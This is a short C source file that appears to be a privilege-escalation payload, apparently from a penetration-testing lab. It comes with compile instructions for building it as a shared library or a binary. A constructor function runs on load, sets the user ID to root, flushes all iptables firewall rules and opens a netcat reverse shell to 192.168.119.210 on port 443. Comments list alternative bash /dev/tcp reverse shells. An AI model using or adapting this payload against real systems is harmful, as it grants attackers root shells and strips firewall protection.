#include <stdio.h>
#include <stdlib.h>

/* COMPILATION INSTRUCTIONS
 *
 * .so (shared library)
 * $ gcc -o exploit.so -shared exploit.c -fPIC
 *
 * .elf (normal binary)
 * $ gcc exploit.c -o exploit
 */

static void smash() __attribute__((constructor));

void smash() {
  setresuid(0,0,0);
  system("iptables --flush"); // remove all firewall rules
  system("nc 192.168.119.210 443 -e /bin/bash"); // netcat reverse shell

  // OTHER METHODS TO TEST CODE EXEC
  // system("ping 192.168.119.210");

  // OTHER RSHELL OPTIONS
  //system("/bin/bash -l > /dev/tcp/192.168.119.210/443 0<&1 2>&1");
  //system("bash -i >& /dev/tcp/192.168.119.210/443 0>&1");
}
